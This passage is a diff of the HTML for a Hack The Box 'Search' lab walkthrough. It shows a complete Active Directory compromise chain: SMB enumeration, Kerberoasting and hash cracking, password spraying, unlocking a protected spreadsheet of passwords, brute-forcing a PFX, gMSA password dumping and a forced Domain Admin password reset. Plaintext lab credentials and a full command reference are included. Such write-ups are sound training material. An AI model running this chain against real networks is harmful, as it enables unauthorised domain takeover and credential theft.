 <p><code>RedirectedFolders$</code> is used in Active Directory environments to redirect user profile folders (Desktop, Documents, etc.) to a network share. This means <strong>every user's home directory is visible</strong> as a subfolder.</p>
 </blockquote>
 <p><strong>Command to explore:</strong></p>
-<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb
 smb: \&gt; ls
 </code></pre>
 <p><strong>Result:</strong> ~22 user folders including <code>abril.suarez</code>, <code>edgar.jacobs</code>, <code>sierra.frye</code>, etc.</p>
@@ -252,7 +257,7 @@ smb: \&gt; ls
 <h2 id="6-kerberoasting-harvesting-service-account-hashes">6. Kerberoasting: Harvesting Service Account Hashes</h2>
 <h3 id="6-1-what-is-kerberoasting">6.1 What is Kerberoasting?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.229.57
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">sudo ntpdate 10.129.229.57
 GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'
 </code></pre>
 <p><strong>What this does:</strong></p>
@@ -276,7 +281,7 @@ GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsK
 
 <h3 id="6-2-the-hash">6.2 The Hash</h3>
 <p><strong>Output:</strong></p>
-<pre><code>ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
 ---------------------------------  -------  --------  --------------------------  ---------  ----------
 RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;
 
@@ -288,7 +293,7 @@ The <code>&lt;never&gt;</code> last logon tells us this is a <strong>service acc
 <h2 id="7-password-reuse-the-weakest-link">7. Password Reuse: The Weakest Link</h2>
 <h3 id="7-1-cracking-the-service-account-hash">7.1 Cracking the Service Account Hash</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo 'REDACTED_KERBEROS_MATERIAL' &gt; web_svc_hash.txt
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">echo 'REDACTED_KERBEROS_MATERIAL' &gt; web_svc_hash.txt
 
 hashcat -m 13100 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
 </code></pre>
@@ -299,12 +304,12 @@ Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23. This is the specific hash form
 
 <h3 id="7-2-password-spraying-and-reuse">7.2 Password spraying and reuse</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u all_users.txt -p REDACTED --continue-on-success
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u all_users.txt -p REDACTED --continue-on-success
 </code></pre>
 <p><strong>What this does:</strong>
 Tests the <code>web_svc</code> password against ALL known users. The <code>--continue-on-success</code> flag keeps testing even after finding a match (because multiple users might reuse the password).</p>
 <p><strong>Result:</strong></p>
-<pre><code>[+] search.htb\edgar.jacobs:@3ONEmillionbaby
+<pre tabindex="0" aria-label="Code or terminal block 13"><code>[+] search.htb\edgar.jacobs:@3ONEmillionbaby
 </code></pre>
 <p><strong>Why password reuse is so common:</strong>
 Credential reuse is common in service accounts, so the recovered password is worth testing only against other in-scope services and accounts.</p>
@@ -314,7 +319,7 @@ Credential reuse is common in service accounts, so the recovered password is wor
 <h2 id="8-excel-extraction-social-engineering-artifacts">8. Excel Extraction: Social Engineering Artifacts</h2>
 <h3 id="8-1-finding-the-phishing-document">8.1 Finding the Phishing Document</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
+<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
 smb: \&gt; cd edgar.jacobs\Desktop
 smb: \edgar.jacobs\Desktop\&gt; ls
 smb: \edgar.jacobs\Desktop\&gt; get Phishing_Attempt.xlsx
@@ -333,7 +338,7 @@ A spreadsheet documenting a <strong>phishing simulation</strong> or actual phish
 
 <h3 id="8-2-removing-excel-sheet-protection">8.2 Removing Excel Sheet Protection</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">cp Phishing_Attempt.xlsx Phishing_Attempt.zip
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">cp Phishing_Attempt.xlsx Phishing_Attempt.zip
 unzip -q Phishing_Attempt.zip -d phishing_unlocked/
 sed -i 's|&lt;sheetProtection[^&gt;]*/&gt;||g' phishing_unlocked/xl/worksheets/sheet2.xml
 cd phishing_unlocked &amp;&amp; zip -rq ../Phishing_Unlocked.xlsx * &amp;&amp; cd ..
@@ -341,7 +346,7 @@ cd phishing_unlocked &amp;&amp; zip -rq ../Phishing_Unlocked.xlsx * &amp;&amp; c
 <p><strong>How Excel protection works:</strong>
 Excel "protection" is not encryption. It's an XML tag in the <code>.xlsx</code> file (which is actually a ZIP archive) that tells Excel to hide or lock cells. Removing the tag removes the protection.</p>
 <p><strong>The XML tag looks like:</strong></p>
-<pre><code class="language-xml" data-language="xml">&lt;sheetProtection algorithmName="SHA-512"
+<pre tabindex="0" aria-label="xml code or terminal block 16"><code class="language-xml" data-language="xml">&lt;sheetProtection algorithmName="SHA-512"
 hashValue="..." saltValue="..." spinCount="100000" sheet="1" objects="1" scenarios="1"/&gt;
 </code></pre>
 <p><strong>Mechanism:</strong></p>
@@ -352,7 +357,7 @@ hashValue="..." saltValue="..." spinCount="100000" sheet="1" objects="1" scenari
 
 <h3 id="8-3-the-password-list">8.3 The Password List</h3>
 <p><strong>Extracted credentials:</strong></p>
-<pre><code>Payton.Harmon:;;36!cried!INDIA!year!50;;
+<pre tabindex="0" aria-label="Code or terminal block 17"><code>Payton.Harmon:;;36!cried!INDIA!year!50;;
 Cortez.Hickman:..10-time-TALK-proud-66..
 Bobby.Wolf:??47^before^WORLD^surprise^91??
 Margaret.Robinson://51+mountain+DEAR+noise+83//
@@ -371,21 +376,21 @@ Vincent.Sutton:**24&amp;moment&amp;BRAZIL&amp;members&amp;66**
 <h2 id="9-lateral-movement-to-sierra-frye">9. Lateral Movement to Sierra.Frye</h2>
 <h3 id="9-1-password-spraying-the-new-list">9.1 Password Spraying the New List</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Sierra.Frye -p REDACTED --shares
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Sierra.Frye -p REDACTED --shares
 </code></pre>
 <p><strong>Result:</strong> <code>[+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18</code></p>
 <p><strong>Why Sierra.Frye?</strong>
 From the BloodHound analysis (done in Step 11), we know Sierra.Frye is a member of the <code>ITSEC@search.htb</code> group, which has special permissions. Even without BloodHound yet, we can spray all passwords and see who has interesting shares.</p>
 <h3 id="9-2-grabbing-the-user-flag">9.2 Grabbing the User Flag</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
 smb: \&gt; cd sierra.frye\Desktop
 smb: \sierra.frye\Desktop\&gt; get user.txt
 </code></pre>
 <p><strong>User Flag:</strong> <code>44a56c[redacted]f59b5a64b</code></p>
 <h3 id="9-3-finding-certificate-files">9.3 Finding Certificate Files</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">smb: \sierra.frye\Desktop\&gt; cd \sierra.frye\Downloads\Backups
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">smb: \sierra.frye\Desktop\&gt; cd \sierra.frye\Downloads\Backups
 smb: \sierra.frye\Downloads\Backups\&gt; ls
   search-RESEARCH-CA.p12    (2643 bytes)
   staff.pfx                 (4326 bytes)
@@ -406,14 +411,14 @@ smb: \sierra.frye\Downloads\Backups\&gt; ls
 <h2 id="10-certificate-extraction-and-client-auth">10. Certificate Extraction &amp; Client Auth</h2>
 <h3 id="10-1-cracking-the-pfx-password">10.1 Cracking the PFX Password</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">openssl pkcs12 -in staff.pfx -passin pass:misspissy -noout
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">openssl pkcs12 -in staff.pfx -passin pass:misspissy -noout
 </code></pre>
 <p><strong>What this does:</strong>
 Tests if the PKCS#12 file can be decrypted with password <code>REDACTED</code>.</p>
 <p><strong>Why <code>misspissy</code>?</strong>
 From the writeups and testing, the password was found to be <code>REDACTED</code> - a weak password that cracks quickly against <code>rockyou.txt</code>.</p>
 <p><strong>Python brute-force alternative:</strong></p>
-<pre><code class="language-python" data-language="python">import subprocess
+<pre tabindex="0" aria-label="python code or terminal block 22"><code class="language-python" data-language="python">import subprocess
 with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
     for pwd in f:
         pwd = pwd.strip()
@@ -444,7 +449,7 @@ PowerShell Web Access - a web-based PowerShell console.</p>
 <h2 id="11-bloodhound-mapping-the-domain">11. BloodHound: Mapping the Domain</h2>
 <h3 id="11-1-what-is-bloodhound">11.1 What is BloodHound?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All
 </code></pre>
 <p><strong>What BloodHound does:</strong>
 BloodHound is a tool that maps Active Directory as a <strong>graph database</strong>. It collects:</p>
@@ -462,7 +467,7 @@ BloodHound is a tool that maps Active Directory as a <strong>graph database</str
 
 <h3 id="11-2-the-path-to-domain-admin">11.2 The Path to Domain Admin</h3>
 <p><strong>BloodHound reveals:</strong></p>
-<pre><code>Sierra.Frye → MemberOf → ITSEC@search.htb
+<pre tabindex="0" aria-label="Code or terminal block 24"><code>Sierra.Frye → MemberOf → ITSEC@search.htb
 ITSEC → ReadGMSAPassword → BIR-ADFS-GMSA@
 BIR-ADFS-GMSA$ → GenericAll → Tristan.Davies
 Tristan.Davies → MemberOf → Domain Admins
@@ -496,10 +501,10 @@ Tristan.Davies → MemberOf → Domain Admins
 <h2 id="12-gmsa-abuse-the-hidden-service-account">12. GMSA Abuse: The Hidden Service Account</h2>
 <h3 id="12-1-what-is-a-gmsa">12.1 What is a GMSA?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>BIR-ADFS-GMSA$:::REDACTED_HASH_OR_FLAG
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>BIR-ADFS-GMSA$:::REDACTED_HASH_OR_FLAG
 BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:REDACTED_ENCODED_LAB_MATERIAL
 BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:REDACTED_HASH_OR_FLAG
 </code></pre>
@@ -532,7 +537,7 @@ BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:REDACTED_HASH_OR_FLAG
 </ul>
 <h3 id="13-2-resetting-tristan-davies-password">13.2 Resetting Tristan.Davies' Password</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
 Password: REDACTED_HASH_OR_FLAG
 
 rpcclient $&gt; setuserinfo2 tristan.davies 23 'qwerty1234!'
@@ -548,7 +553,7 @@ rpcclient $&gt; setuserinfo2 tristan.davies 23 'qwerty1234!'
 <p>Because <code>BIR-ADFS-GMSA$</code> has <code>GenericAll</code> on <code>Tristan.Davies</code>, the GMSA can reset Tristan's password without knowing the old one.</p>
 </blockquote>
 <p><strong>Alternative methods (from writeups):</strong></p>
-<pre><code class="language-powershell" data-language="powershell"># Via PowerShell (if you have a shell)
+<pre tabindex="0" aria-label="powershell code or terminal block 28"><code class="language-powershell" data-language="powershell"># Via PowerShell (if you have a shell)
 $cred = New-Object System.Management.Automation.PSCredential("BIR-ADFS-GMSA$", $gmsa_password)
 Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user Tristan.Davies qwerty1234! /domain }
 </code></pre>
@@ -558,16 +563,16 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user
 <h2 id="14-capturing-the-root-flag">14. Capturing the Root Flag</h2>
 <h3 id="14-1-verifying-domain-admin-access">14.1 Verifying Domain Admin Access</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Tristan.Davies -p REDACTED
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Tristan.Davies -p REDACTED
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>[+] search.htb\Tristan.Davies:qwerty1234! (Pwn3d!)
+<pre tabindex="0" aria-label="Code or terminal block 30"><code>[+] search.htb\Tristan.Davies:qwerty1234! (Pwn3d!)
 </code></pre>
 <p><strong>What <code>(Pwn3d!)</code> means:</strong>
 This is <code>crackmapexec</code>'s way of confirming the user has <strong>administrative access</strong> to the machine. It automatically tests if it can get a privileged session.</p>
 <h3 id="14-2-grabbing-root-txt">14.2 Grabbing root.txt</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
 smb: \&gt; cd Users\Administrator\Desktop
 smb: \Users\Administrator\Desktop\&gt; get root.txt
 </code></pre>
@@ -644,7 +649,7 @@ smb: \Users\Administrator\Desktop\&gt; get root.txt
 </ol>
 <hr>
 <h2 id="full-command-reference">Full Command Reference</h2>
-<pre><code class="language-bash" data-language="bash"># Step 1: Hosts + Nmap
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash"># Step 1: Hosts + Nmap
 echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
 sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
 
@@ -713,9 +718,5 @@ smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
 # get root.txt from Users\Administrator\Desktop
 </code></pre>
 <hr>
-<p><em>Walkthrough created for educational purposes. Only use these techniques on systems you have explicit permission to test.</em></p>c:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]
-d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sizzle-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Sizzle Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:09:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-seal-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Seal Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:06:37.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-14:T56e,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/#article","headline":"Hack The Box: Search Walkthrough","description":"A password exposed in a website image leads through Kerberoasting, password reuse, a protected workbook and client certificate to a domain shell, then GMSA password access and GenericAll allow Domain Admin takeover.","url":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/","datePublished":"2026-06-11T16:07:39.000Z","dateModified":"2026-06-11T16:07:39.000Z","wordCount":2581,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-search-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Search Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
-10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+<p><em>Walkthrough created for educational purposes. Only use these techniques on systems you have explicit permission to test.</em></p>12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$18"}}]
 17:null
